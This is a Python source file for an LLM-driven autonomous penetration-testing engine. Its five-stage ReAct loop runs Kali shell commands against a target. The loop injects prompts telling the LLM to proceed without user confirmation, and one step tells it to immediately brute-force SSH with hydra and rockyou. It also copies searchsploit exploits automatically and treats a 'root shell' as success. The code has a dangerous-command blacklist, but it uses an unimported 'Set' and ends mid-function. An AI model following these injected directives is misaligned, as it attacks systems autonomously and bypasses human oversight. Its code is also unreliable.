"""
整合版 AutoPilot 引擎 (core/auto_pilot.py)
=========================================
基于新引擎 5 阶段管线 + 旧引擎 ReAct 真实执行能力。

管线:
1. Stage 1: Initialization - 目标分析 + 可达性验证
2. Stage 2: Info Gathering - ReAct 循环：全量信息收集 (nmap/masscan/ffuf/etc)
3. Stage 3: Vuln Prioritization - 漏洞排序 + searchsploit CVE 查证
4. Stage 4: Exploitation - ReAct 循环：按优先级利用漏洞
5. Stage 5: Reporting - 多格式报告生成 (JSON/HTML/PDF)

特性:
- ReAct 循环：LLM 思考 → 工具调用 → 执行 → 分析 → 继续
- 实时控制台输出: [思考] [计划] [执行] [结果] [发现]
- 命令安全拦截（危险命令黑名单 + 注入检测）
- 停止关键词自动终止（root shell / 提权成功 / 遇到瓶颈）
- CVE 自动查询（searchsploit）
- 凭证自动检测（SSH Key / Hydra 结果 / 密码 / API Token）
- 工具替代建议（nikto→wapiti, gobuster→dirsearch 等）
- 用户交互: pause/continue/stop/strategy/status
- 断点续扫: SQLite 每阶段保存进度
- 阶段超时保护，多模型 LLM 降级
"""

from __future__ import annotations

import asyncio
import json
import re
import sqlite3
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from rich.console import Console

from config.settings import Settings
from core.llm_client import LLMClient
from core.state_manager import StateManager
from core.security import SecurityGuard
from utils.logger import get_logger

logger = get_logger(__name__)

# ========================================================================
# 模块级常量
# ========================================================================

# AutoPilot 停止关键词（LLM 输出中包含任一关键词时自动终止当前阶段）
AUTO_PILOT_STOP_KEYWORDS: List[str] = [
    "root shell", "ROOT SHELL", "提权成功", "获得 root",
    "遇到瓶颈", "需要人工介入", "人工介入",
    "无法自动绕过", "遇到无法绕过",
    "双因素", "验证码", "CAPTCHA",
]

# 每阶段最大 ReAct 步数
DEFAULT_REACT_MAX_STEPS: int = 20

# 每阶段超时（秒）
DEFAULT_STAGE_TIMEOUT: int = 300

# 工具替代映射（慢→快）
TOOL_ALTERNATIVES: Dict[str, str] = {
    "nikto": "wapiti",
    "dirsearch": "gobuster",
    "skipfish": "wapiti",
    "wpscan": "wapiti",
    "whatweb": "curl -I",
}

# 交互式工具列表（需要人工干预，或会在无输入时挂死）
INTERACTIVE_TOOLS: List[str] = [
    "msfconsole", "msfvenom", "ftp", "sftp", "telnet",
    "nc -lv", "ncat -lv", "socat",
    "mysql", "psql", "redis-cli", "mongo",
    "su", "passwd",
]

# 交互式命令模式（包含这些模式时不带非交互参数会挂死）
INTERACTIVE_PATTERNS: List[str] = [
    "mysql.* -p[^\"' ]",  # mysql -p 不带密码
    "mysql.* --password",  # mysql --password 不带参数
    "su ",                # su 切换用户
    "ssh .*@",            # ssh user@host 不带命令
]

# 全局 AutoPilotEngine 注册表 (供 websocket.py 控制正在运行的引擎)
_running_engines: Dict[str, "AutoPilotEngine"] = {}


def _smart_truncate(text: str, max_chars: int = 3000, head: int = 1000, tail: int = 1000) -> str:
    """智能截断长文本，保留首尾关键信息。"""
    if not text or len(text) <= max_chars:
        return text
    head_text = text[:head]
    tail_text = text[-tail:]
    return (
        f"{head_text}\n"
        f"[... AutoPilot 智能截断：已省略 {len(text) - head - tail} 字符 ...]\n"
        f"{tail_text}"
    )


def _strip_ansi(text: str) -> str:
    """去除终端 ANSI 转义码（searchsploit 等工具输出的颜色控制符）。"""
    return re.sub(r'\x1b\[[0-9;]*[a-zA-Z]|\x1b\][0-9;]*[a-zA-Z]|\x1b\[[0-9;]*?[K]', '', text)


# ========================================================================
# 整合版 AutoPilot 引擎
# ========================================================================

class AutoPilotEngine:
    """
    整合版 AutoPilot 引擎：5 阶段管线 + ReAct 真实执行。
    """

    def __init__(
        self,
        session_id: str,
        target: str,
        llm_client: LLMClient,
        state_manager: StateManager,
        settings: Settings,
        console: Optional[Console] = None,
        security: Optional[SecurityGuard] = None,
    ):
        self.session_id = session_id
        self.target = target
        self.llm_client = llm_client
        self.state_manager = state_manager
        self.settings = settings
        self.console = console or Console()
        self._security = security or SecurityGuard()

        # 阶段状态
        self.current_stage = 1
        self.stage_results: Dict[int, Any] = {}
        self.is_paused = False
        self.is_stopped = False
        self.user_strategy: Optional[str] = None

        # WebSocket 管理器（由 orchestrator 注入）
        self._ws_manager = None

        # 进度保存 (SQLite)
        _data_dir = getattr(settings, "data_dir", "./data")
        self._db_path = Path(_data_dir) / "autopilot_progress.db"
        self._init_db()

        # 结果数据
        self.vuln_list: List[Dict[str, Any]] = []
        self.exploit_results: List[Dict[str, Any]] = []

        # 凭证检测
        self.found_credentials: List[Dict[str, str]] = []

        # 阶段超时（可配置，默认 600s）
        self._stage_timeout: int = getattr(self.settings, "stage_timeout", 600)

        # ReAct 计数器
        self._react_step = 0
        self._last_tool_time = 0.0

        # ★ 命令去重缓存 + 死循环检测
        self._executed_commands: Set[str] = set()
        self._stale_step_count = 0
        self._last_findings_count = 0
        # ★ 工具链数据传递（如 searchsploit 提取的用户名）
        self.found_usernames: List[str] = []

        logger.info("[AutoPilotEngine] 整合版初始化: session_id=%s, target=%s", session_id, target)

    # ==================================================================
    # 进度保存/加载 (断点续扫)
    # ==================================================================

    def _init_db(self) -> None:
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(str(self._db_path)) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS progress (
                    session_id TEXT PRIMARY KEY,
                    target TEXT NOT NULL,
                    current_stage INTEGER NOT NULL,
                    stage_results TEXT,
                    vuln_list TEXT,
                    exploit_results TEXT,
                    found_credentials TEXT,
                    updated_at REAL NOT NULL
                )
            """)
            conn.commit()

    def _save_progress(self) -> None:
        try:
            with sqlite3.connect(str(self._db_path)) as conn:
                conn.execute("""
                    INSERT INTO progress
                    (session_id, target, current_stage, stage_results, vuln_list, exploit_results, found_credentials, updated_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(session_id) DO UPDATE SET
                        current_stage=excluded.current_stage,
                        stage_results=excluded.stage_results,
                        vuln_list=excluded.vuln_list,
                        exploit_results=excluded.exploit_results,
                        found_credentials=excluded.found_credentials,
                        updated_at=excluded.updated_at
                """, (
                    self.session_id,
                    self.target,
                    self.current_stage,
                    json.dumps(self.stage_results, ensure_ascii=False),
                    json.dumps(self.vuln_list, ensure_ascii=False),
                    json.dumps(self.exploit_results, ensure_ascii=False),
                    json.dumps(self.found_credentials, ensure_ascii=False),
                    time.time(),
                ))
                conn.commit()
            logger.debug("[AutoPilotEngine] 进度已保存: stage=%d", self.current_stage)
        except Exception as exc:
            logger.warning("[AutoPilotEngine] 保存进度失败: %s", exc)

    def _load_progress(self) -> bool:
        try:
            with sqlite3.connect(str(self._db_path)) as conn:
                row = conn.execute(
                    "SELECT current_stage, stage_results, vuln_list, exploit_results, found_credentials FROM progress WHERE session_id = ?",
                    (self.session_id,)
                ).fetchone()
            if row is None:
                return False
            self.current_stage = row[0]
            self.stage_results = json.loads(row[1]) if row[1] else {}
            self.vuln_list = json.loads(row[2]) if row[2] else []
            self.exploit_results = json.loads(row[3]) if row[3] else []
            self.found_credentials = json.loads(row[4]) if row[4] else []
            logger.info("[AutoPilotEngine] 进度已加载: stage=%d, credentials=%d",
                         self.current_stage, len(self.found_credentials))
            return True
        except Exception as exc:
            logger.warning("[AutoPilotEngine] 加载进度失败: %s", exc)
            return False

    # ==================================================================
    # WebSocket 实时推送
    # ==================================================================

    def _broadcast_ws(self, category: str, msg: str, *, level: str = "info", detail: Optional[str] = None) -> None:
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                payload = {
                    "type": "autopilot_log",
                    "session_id": self.session_id,
                    "category": category,
                    "level": level,
                    "source": "AutoPilot",
                    "message": msg,
                    "detail": detail,
                    "phase": f"Stage{self.current_stage}",
                    "step": self.current_stage,
                    "timestamp": int(time.time() * 1000),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    def _push_state_change(self, description: str = "") -> None:
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                phase_names = {1: "初始化", 2: "信息收集", 3: "漏洞排序", 4: "漏洞利用", 5: "生成报告"}
                payload = {
                    "type": "autopilot_state_change",
                    "session_id": self.session_id,
                    "state": "RUNNING" if not self.is_paused else "PAUSED",
                    "phase": f"Stage{self.current_stage}",
                    "phase_name": phase_names.get(self.current_stage, ""),
                    "step": self.current_stage,
                    "total_steps": 5,
                    "progress": (self.current_stage - 1) * 20,
                    "description": description,
                    "timestamp": int(time.time() * 1000),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    async def _update_session_phase(self, phase: str, status: Optional[str] = None) -> None:
        """更新数据库中的会话阶段和状态。"""
        try:
            await self.state_manager.set_phase(phase, self.session_id)
        except Exception:
            pass

        # 同步更新状态（如果提供）
        if status:
            try:
                from db.database import get_database
                from db.models import Session
                from sqlalchemy import select
                db = get_database()
                async with db.get_session() as sess:
                    result = await sess.execute(select(Session).where(Session.id == self.session_id))
                    s = result.scalar_one_or_none()
                    if s:
                        s.status = status
                        s.phase = phase
                        await sess.commit()
            except Exception:
                pass

    async def _send_ws(self, payload: dict) -> None:
        try:
            if self._ws_manager:
                await self._ws_manager.broadcast(payload)
        except Exception:
            pass

    def _push_notification(self, title: str, message: str, level: str = "info", detail: Optional[str] = None) -> None:
        """推送通知到前端。"""
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                payload = {
                    "type": "autopilot_notification",
                    "session_id": self.session_id,
                    "level": level,
                    "title": title,
                    "message": message,
                    "detail": detail,
                    "timestamp": time.time(),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    def _push_command_pending(self, command: str) -> None:
        """推送待执行命令到前端。"""
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                payload = {
                    "type": "autopilot_command_pending",
                    "session_id": self.session_id,
                    "command": command,
                    "timestamp": time.time(),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    def _push_exec_result(self, command: str, result: str, success: bool) -> None:
        """推送命令执行结果到前端实时日志。"""
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                truncated = (result[:2000] + "...") if len(result) > 2000 else result
                payload = {
                    "type": "autopilot_exec_result",
                    "session_id": self.session_id,
                    "command": command,
                    "result": truncated,
                    "success": success,
                    "phase": f"Stage{self.current_stage}",
                    "timestamp": time.time(),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    # ---- 日志辅助 ----

    def _log_think(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[dim cyan][{ts}] [思考][/dim cyan] {msg}")
        logger.info("[思考] %s", msg)
        self._broadcast_ws("ai_thought", msg, level="debug")

    def _log_plan(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold blue][{ts}] [计划][/bold blue] {msg}")
        logger.info("[计划] %s", msg)
        self._broadcast_ws("ai_plan", msg, level="info")

    def _log_exec(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[yellow][{ts}] [执行][/yellow] {msg}")
        logger.info("[执行] %s", msg)
        self._broadcast_ws("tool_start", msg, level="info")

    def _log_result(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold green][{ts}] [结果][/bold green] {msg}")
        logger.info("[结果] %s", msg)
        self._broadcast_ws("ai_analysis", msg, level="info")

    def _log_error(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold red][{ts}] [错误][/bold red] {msg}")
        logger.error("[错误] %s", msg)
        self._broadcast_ws("error", msg, level="error")

    def _log_system(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold blue][{ts}] [系统][/bold blue] {msg}")
        logger.info("[系统] %s", msg)
        self._broadcast_ws("system", msg, level="info")

    def _log_phase(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold magenta][{ts}] [阶段][/bold magenta] {msg}")
        logger.info("[阶段] %s", msg)
        self._broadcast_ws("phase", msg, level="info")
        self._push_state_change(msg)

    def _log_finding(self, msg: str, severity: str = "medium") -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold orange][{ts}] [发现][/bold orange] {msg}")
        logger.info("[发现] %s", msg)
        self._broadcast_ws("finding", msg, level="warning" if severity in ("high", "critical") else "info")
        # 推送 finding 消息（前端通知）
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                payload = {
                    "type": "autopilot_finding",
                    "session_id": self.session_id,
                    "finding_type": "vulnerability",
                    "severity": severity,
                    "title": msg[:80],
                    "description": msg,
                    "timestamp": int(time.time() * 1000),
                }
                asyncio.ensure_future(self._send_ws(payload))
        except Exception:
            pass

    def _log_success(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold green][{ts}] [成功][/bold green] {msg}")
        logger.info("[成功] %s", msg)
        self._broadcast_ws("success", msg, level="success")

    def _log_warning(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[bold yellow][{ts}] [警告][/bold yellow] {msg}")
        logger.warning("[警告] %s", msg)
        self._broadcast_ws("warning", msg, level="warning")

    # ==================================================================
    # ReAct 循环核心
    # ==================================================================

    async def _react_loop(
        self,
        user_prompt: Optional[str] = None,
        stage_name: str = "",
        *,
        timeout: float = DEFAULT_STAGE_TIMEOUT,
        max_steps: int = DEFAULT_REACT_MAX_STEPS,
        skip_prompt_append: bool = False,
    ) -> Dict[str, Any]:
        """
        ReAct 循环：LLM 思考 → 工具调用 → 命令执行 → 分析结果 → 继续。

        参数:
            user_prompt: 当前阶段的初始用户消息
            stage_name: 阶段名称（日志用）
            timeout: 阶段超时（秒）
            max_steps: 最大 ReAct 步数
            skip_prompt_append: True 时跳过追加 prompt（上下文已在外部重置过）

        返回:
            {"steps": int, "tool_calls": int, "stop_reason": str, "final_content": str}
        """
        self._react_step = 0
        self._last_tool_time = time.time()
        start_time = time.time()

        self._log_think(f"进入 ReAct 循环 [{stage_name}]，开始分析目标...")

        # 追加阶段提示词到 LLM 消息历史（除非上下文已在外部重置）
        if user_prompt and not skip_prompt_append:
            self.llm_client.append_user(user_prompt)

        stats = {"steps": 0, "tool_calls": 0, "stop_reason": "completed", "final_content": ""}
        last_content = ""

        while self._react_step < max_steps:
            # --- 超时检查 ---
            elapsed = time.time() - start_time
            if elapsed > timeout:
                self._log_warning(f"[{stage_name}] 阶段超时 ({timeout}s, 已用 {elapsed:.0f}s)")
                stats["stop_reason"] = "timeout"
                break

            # --- 暂停/停止检查 ---
            if not await self._wait_if_paused():
                stats["stop_reason"] = "stopped"
                break

            self._react_step += 1
            stats["steps"] = self._react_step

            # --- 长时间无进展通知（超过 3 分钟） ---
            if time.time() - self._last_tool_time > 180:
                self._push_notification(
                    "AutoPilot 长时间无进展",
                    f"[{stage_name}] 已超过 3 分钟没有新命令执行",
                    level="warning",
                )
                self._last_tool_time = time.time()

            self._log_plan(f"[{stage_name}] ReAct 第 {self._react_step} 步")

            # --- 调用 LLM ---
            try:
                full_content, tool_call_dicts = await asyncio.to_thread(
                    self.llm_client.stream_chat,
                    autopilot=True,
                    enable_tools=True,
                )
            except Exception as exc:
                self._log_error(f"[{stage_name}] LLM 调用失败: {exc}")
                stats["stop_reason"] = "llm_error"
                break

            last_content = full_content or ""

            # --- 停止关键词检测（LLM 输出中包含完成/中断信号） ---
            if full_content and self._check_stop_keywords(full_content):
                self._log_success(f"[{stage_name}] 检测到完成信号: {full_content[:120]}...")
                self.llm_client.append_assistant(full_content, None)
                stats["stop_reason"] = "stop_keyword"
                stats["final_content"] = full_content
                # 记录执行步骤
                await self._add_execution_step("ai_analysis", llm_content=full_content[:500])
                break

            has_tool_calls = len(tool_call_dicts) > 0

            # --- 推送 AI 响应到前端（无论是否有文本内容，即使只有 tool_calls） ---
            if full_content:
                self._log_result(f"AI 分析: {full_content[:200]}...")
            # 总是推送一条到聊天窗口
            ai_content = full_content or (f"🛠️ 正在执行 {len(tool_call_dicts)} 个工具..." if tool_call_dicts else "")
            if ai_content:
                try:
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        payload = {
                            "type": "autopilot_ai_response",
                            "session_id": self.session_id,
                            "content": ai_content,
                            "phase": f"Stage{self.current_stage}",
                            "timestamp": time.time(),
                        }
                        asyncio.ensure_future(self._send_ws(payload))
                except Exception:
                    pass
            if full_content:
                await self._add_execution_step("ai_analysis", llm_content=full_content[:500])

            # --- 处理工具调用 ---
            if has_tool_calls:
                self.llm_client.append_assistant(full_content, tool_call_dicts)
                should_continue = await self._handle_tool_calls(tool_call_dicts)
                stats["tool_calls"] += len(tool_call_dicts)

                # ★ 死循环检测：连续多次无新发现 → 强制退出 ReAct
                if self._check_react_stale(len(tool_call_dicts)):
                    stats["stop_reason"] = "stale_loop"
                    self._log_warning(f"[{stage_name}] 检测到死循环，强制结束 ReAct 循环")
                    break

                if not should_continue:
                    stats["stop_reason"] = "user_abort"
                    break

                # 继续循环
                self._log_think(f"[{stage_name}] 工具执行完成，继续 LLM 推理...")
                continue
            else:
                # 纯文本回复（无工具调用）
                self.llm_client.append_assistant(full_content, None)

                # ★ 如果之前调过工具且有剩余步数 → LLM 在做中间分析总结，推一把继续
                if stats["tool_calls"] > 0 and self._react_step < max_steps * 0.8:
                    self._log_think(f"[{stage_name}] LLM 正在中间总结，推一把继续执行...")
                    # 追加一条指令让 LLM 继续自动执行下一阶段探测
                    self.llm_client.append_user(
                        "收到，继续自动执行。不要询问用户确认，直接进行下一步探测。"
                        "检查哪些服务/端口还没有深入探测（如FTP匿名登录、SMB共享枚举、目录扫描、searchsploit查CVE），自动完成全部信息收集。"
                    )
                    continue  # 不走 break，让循环再跑一轮

                # 没有历史工具调用 → 正常结束
                stats["stop_reason"] = "no_tool_calls"
                stats["final_content"] = full_content or ""
                self._log_result(f"[{stage_name}] ReAct 循环完成（LLM 无需调用工具）")
                break

        self._log_system(f"[{stage_name}] ReAct 循环结束: {stats['stop_reason']}, {stats['steps']} 步, {stats['tool_calls']} 次工具调用")
        return stats

    # ==================================================================
    # 工具调用处理
    # ==================================================================

    async def _handle_tool_calls(self, tool_call_dicts: List[dict]) -> bool:
        """
        执行 LLM 返回的工具调用。

        返回 True 表示继续 ReAct 循环，False 表示中止。
        """
        for tc in tool_call_dicts:
            if self.is_stopped:
                logger.info("[AutoPilot] 引擎已停止，跳过工具调用")
                break

            fn_name = tc["function"]["name"]
            raw_args = tc["function"].get("arguments", "{}")
            if isinstance(raw_args, str) and raw_args.strip():
                try:
                    args_json = json.loads(raw_args)
                except Exception:
                    args_json = {}
            elif isinstance(raw_args, dict):
                args_json = raw_args
            else:
                args_json = {}

            if fn_name == "execute_kali_command":
                command = str(args_json.get("command", ""))
                if not command:
                    continue

                # --- 推送待执行命令 ---
                self._push_command_pending(command)

                # --- 工具替代建议 ---
                cmd_lower = command.lower().strip()
                chosen_tool = cmd_lower.split()[0] if cmd_lower.split() else ""
                better_tool = TOOL_ALTERNATIVES.get(chosen_tool, "")

                command_to_run = command  # 默认使用原命令
                if better_tool:
                    # 广播工具选择请求
                    choice_future = asyncio.get_running_loop().create_future()
                    from core.orchestrator import _tool_choice_futures
                    _tool_choice_futures[self.session_id] = choice_future
                    try:
                        loop = asyncio.get_event_loop()
                        if loop.is_running():
                            payload = {
                                "type": "autopilot_tool_choice",
                                "session_id": self.session_id,
                                "original_command": command,
                                "chosen_tool": chosen_tool,
                                "suggested_tool": better_tool,
                                "reason": f"AI 选择了 {chosen_tool}，但 {better_tool} 更快，是否更换？",
                                "timestamp": time.time(),
                            }
                            asyncio.ensure_future(self._send_ws(payload))
                        try:
                            choice = await asyncio.wait_for(choice_future, timeout=15.0)
                            if choice and choice.get("use_alternative"):
                                parts = command.split(" ", 1)
                                command_to_run = f"{better_tool} {parts[1]}" if len(parts) > 1 else better_tool
                                self._push_notification("工具已替换", f"已将 {chosen_tool} 替换为 {better_tool}")
                        except asyncio.TimeoutError:
                            pass  # 超时用原命令
                    finally:
                        _tool_choice_futures.pop(self.session_id, None)

                self._log_exec(f"执行: {command_to_run[:200]}")

                # --- ★ 命令去重检测 ---
                if not command_to_run.startswith("nmap") and self._is_duplicate_command(command_to_run):
                    dup_msg = f"[系统指令] ⚠️ 命令已执行过（跳过重复执行）:\n{command_to_run[:200]}"
                    self._log_warning(dup_msg)
                    result = dup_msg
                    is_success = True
                else:
                    # --- 执行命令 ---
                    result = await self._execute_command(command_to_run)
                self._last_tool_time = time.time()

                is_success = not (result.startswith("Permission denied") or result.startswith("ERROR:") or result.startswith("[命令执行超时"))
                # TIMEOUT 表示命令还在运行但超时了，不是真正的失败
                is_timeout = result.startswith("[TIMEOUT")

                # --- 推送执行结果 ---
                self._push_exec_result(command_to_run, result, is_success)

                # --- 失败通知 (非 timeout 的真正失败才通知) ---
                if not is_success and not is_timeout:
                    self._push_notification(
                        "命令执行失败",
                        f"命令执行失败",
                        level="error",
                        detail=result[:300],
                    )

                # --- 交互式工具检测 + 悬挂命令拦截 ---
                cmd_check = command_to_run.lower().strip()

                # 检测 mysql -p 不带密码 → 自动追加 -pnone 避免挂死
                import re as _re
                if _re.search(r'mysql\s.*-p(?!\S)', cmd_check) and '-pnone' not in cmd_check:
                    command_to_run = _re.sub(r'-p(\s|$)', '-pnone ', command_to_run)
                    # 确保尾部没有多余空格
                    command_to_run = command_to_run.strip()
                    self._push_notification(
                        "MySQL 命令已自动修正",
                        f"检测到 mysql -p 不带密码（会挂死），已自动追加 -pnone:\n{command_to_run[:200]}",
                        level="warning",
                    )

                # 重新检测（修正后可能已变化）
                cmd_check = command_to_run.lower().strip()
                is_interactive = any(cmd_check.startswith(t) for t in INTERACTIVE_TOOLS)
                # 也检查交互模式
                if not is_interactive:
                    for pat in INTERACTIVE_PATTERNS:
                        if _re.search(pat, cmd_check):
                            is_interactive = True
                            break

                if is_interactive and not _re.search(r'mysql.*-pnone', cmd_check):
                    self._push_notification(
                        "交互式命令即将执行",
                        f"此命令可能等待手动输入: {command_to_run[:120]}",
                        level="warning",
                        detail="此工具需要人工交互或会挂死等待输入。请在终端手动操作，或等待超时后自动继续。",
                    )

                # --- 记录执行步骤到 DB ---
                await self._add_execution_step(
                    "tool_execution",
                    tool_name="execute_kali_command",
                    tool_args={"command": command_to_run},
                    tool_success=is_success,
                    tool_output_summary=result[:500],
                )

                # --- 自动 CVE 查询 ---
                cve_results = self._detect_cves(result, command_to_run)
                combined_result = result
                for cve_text in cve_results:
                    combined_result += f"\n\n{cve_text}"

                # --- 凭证自动检测 ---
                cred_findings = self._detect_credentials(result, command_to_run)
                for cred_type, cred_value in cred_findings:
                    self.found_credentials.append({
                        "type": cred_type,
                        "value": cred_value,
                        "source": command_to_run[:100],
                    })

                # --- 清理 ANSI 码 + 结果增强 ---
                combined_result = _strip_ansi(combined_result)
                combined_result = self._enrich_tool_result(command_to_run, combined_result)

                # --- ★ 漏洞利用链：searchsploit → 自动复制 exploit ---
                if "searchsploit" in command_to_run and "No Results" not in combined_result:
                    exp_paths = re.findall(r'(/usr/share/exploitdb/exploits/\S+)', combined_result)
                    for path in exp_paths[:2]:
                        exploit_dir = Path("exploit")
                        exploit_dir.mkdir(parents=True, exist_ok=True)
                        cp_result = await self._execute_command(f"cp '{path}' exploit/")
                        if "ERROR" not in cp_result:
                            combined_result += f"\n\n[系统指令] ✅ 已自动复制 exploit 到 exploit/: {path}"
                            self._log_success(f"自动复制 exploit: {path}")

                # --- ★ 漏洞利用链：用户名枚举 EXP → 提取用户列表，引导 hydra ---
                if "45233.py" in command_to_run or "ssh_enum" in command_to_run or "CVE-2018-15473" in command_to_run:
                    user_matches = re.findall(r'(?:Found|valid|user)[:\s]*([a-z][a-z0-9_]+)', combined_result, re.IGNORECASE)
                    if user_matches:
                        self.found_usernames = list(set(user_matches))
                        combined_result += (
                            f"\n\n[系统指令] ✅ 发现有效用户名: {', '.join(self.found_usernames)}。"
                            f" 立即使用 hydra 对这些用户名进行 SSH 密码爆破！"
                            f" 命令示例: hydra -L /tmp/valid_users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4"
                        )

                # --- ★ 自动生成用户列表文件（如果 hydra 缺少字典） ---
                if "hydra" in command_to_run and self.found_usernames:
                    # 尝试将用户名写入临时文件供 hydra 使用
                    user_content = "\n".join(self.found_usernames)
                    await self._execute_command(f"echo '{user_content}' > /tmp/pengstrike_users.txt")
                    combined_result += f"\n\n[系统指令] ✅ 已将用户名写入 /tmp/pengstrike_users.txt，hydra 可使用 -L /tmp/pengstrike_users.txt"

                # --- 工具执行结果喂回 LLM ---
                self.llm_client.append_tool_result(
                    tool_call_id=tc["id"] or "",
                    name=fn_name,
                    result=_smart_truncate(combined_result),
                    command=command_to_run,
                )

            else:
                # 未知工具
                error_msg = f"ERROR: Unknown tool {fn_name}"

                # ★ save_exploit 降级处理：直接用 cp 复制
                if fn_name == "save_exploit":
                    source_path = args_json.get("source_path", "")
                    if source_path:
                        exploit_dir = Path("exploit")
                        exploit_dir.mkdir(parents=True, exist_ok=True)
                        cmd = f"cp '{source_path}' exploit/"
                        result = await self._execute_command(cmd)
                        if "ERROR" not in result and "Permission" not in result:
                            error_msg = f"✅ Exploit 已复制到 exploit/: {source_path}"
                        else:
                            error_msg = f"复制失败: {result}"
                self._log_error(error_msg)
                self.llm_client.append_tool_result(
                    tool_call_id=tc["id"] or "",
                    name=fn_name,
                    result=error_msg,
                    command="",
                )

        return True  # 默认继续循环

    # ==================================================================
    # 命令执行
    # ==================================================================

    async def _execute_command(self, command: str) -> str:
        """
        执行系统命令（含安全检查）。

        使用 async subprocess 实现：
        - 超时时返回已有输出，不报失败（标记为 [TIMEOUT - 仍在执行]）
        - 实际失败（非零退出码）正常返回
        - 推送中间进度通知到前端
        """
        if not command or not command.strip():
            return "ERROR: 空命令"

        # 安全检查
        dangerous, reason = self._security.is_dangerous(command)
        if dangerous:
            logger.warning("[DANGEROUS] 危险命令拦截: %s (%s)", command, reason)
            self.console.print(f"[bold red]🚫 危险命令已拦截: {command} ({reason})[/bold red]")
            return "Permission denied: Dangerous command blocked."

        safe, safe_reason = self._security.check_command(command)
        if not safe:
            self.console.print(f"[bold red]🚫 命令被拦截: {safe_reason}[/bold red]")
            logger.warning("command_blocked: command=%s, reason=%s", command, safe_reason)
            return f"Permission denied: {safe_reason}"

        logger.info("[EXEC] %s", command)
        self.console.print(f"[bold magenta]🛠️ [AI 正在执行命令]: {command}[/bold magenta]")

        cmd_lower = command.lower()
        is_slow_tool = ("nmap -p-" in cmd_lower or "gobuster dir" in cmd_lower
                        or "dirb " in cmd_lower or "wapiti" in cmd_lower
                        or "nikto" in cmd_lower)
        if is_slow_tool:
            self.console.print("[dim]⏱️  此命令可能需要数分钟，请耐心等待...[/dim]")

        cmd_timeout = getattr(self.settings, "command_timeout", 300)

        try:
            # 使用 async subprocess，可以流式读取输出
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            collected_output: List[str] = []
            deadline = time.monotonic() + cmd_timeout
            notified_at = 0.0  # 上次推送进度通知的时间

            # 同时读取 stdout 和 stderr（使用大缓冲区避免超长行崩溃）
            async def read_stream(stream, dest: List[str]):
                while True:
                    try:
                        line = await stream.readline()
                        if not line:
                            break
                    except (ValueError, asyncio.LimitOverrunError) as read_err:
                        # 超长行：跳过该行，继续读取
                        logger.warning("[STREAM] 跳过超长行: %s", read_err)
                        try:
                            await stream.readexactly(stream._limit)
                        except Exception:
                            pass
                        continue
                        break
                    decoded = line.decode("utf-8", errors="replace").rstrip("\n")
                    decoded = _strip_ansi(decoded)  # 去除 ANSI 颜色码
                    dest.append(decoded)
                    # 控制台实时输出
                    self.console.print(f"[dim]  | {decoded[:200]}[/dim]")

            readers = [
                asyncio.create_task(read_stream(process.stdout, collected_output)),
                asyncio.create_task(read_stream(process.stderr, collected_output)),
            ]

            while True:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    # 超时：返回已有输出，标记为 timeout 而非 failure
                    process.kill()  # 必须杀掉，否则循环卡住
                    await asyncio.wait(readers, timeout=1.0)
                    partial = "\n".join(collected_output[-50:]) if collected_output else "(无输出)"
                    msg = (
                        f"[TIMEOUT - 命令已运行 {cmd_timeout} 秒，仍在执行中]\n"
                        f"最新输出（最后 50 行）:\n{_smart_truncate(partial, max_chars=1500, head=500, tail=500)}"
                    )
                    self.console.print(f"\n[bold yellow]⏰ 命令已运行 {cmd_timeout} 秒，仍在执行中，已返回部分结果[/bold yellow]")
                    logger.warning("[TIMEOUT-PARTIAL] 命令 %s: 已超时但返回部分结果", command)
                    return msg

                try:
                    done, pending = await asyncio.wait(
                        readers, timeout=min(remaining, 5.0),
                        return_when=asyncio.FIRST_COMPLETED,
                    )
                except asyncio.CancelledError:
                    process.kill()
                    raise

                # 推送进度通知（每 30 秒一次）
                now = time.monotonic()
                if now - notified_at > 30 and collected_output:
                    notified_at = now
                    last_lines = "\n".join(collected_output[-5:])
                    self._push_notification(
                        "命令正在执行中",
                        f"已运行 {int(now - (deadline - cmd_timeout))} 秒，最新输出:\n{_smart_truncate(last_lines, max_chars=300, head=150, tail=100)}",
                        level="info",
                    )

                if not pending:
                    # 所有 stream 都读完了 → 进程已结束
                    break

            # 等待进程完全结束
            await process.wait()
            for t in readers:
                if not t.done():
                    t.cancel()

            full_output = "\n".join(collected_output) if collected_output else "(no output)"
            return_code = process.returncode or 0

            logger.info("[RESULT rc=%d len=%d]", return_code, len(full_output))

            lines = full_output.splitlines()
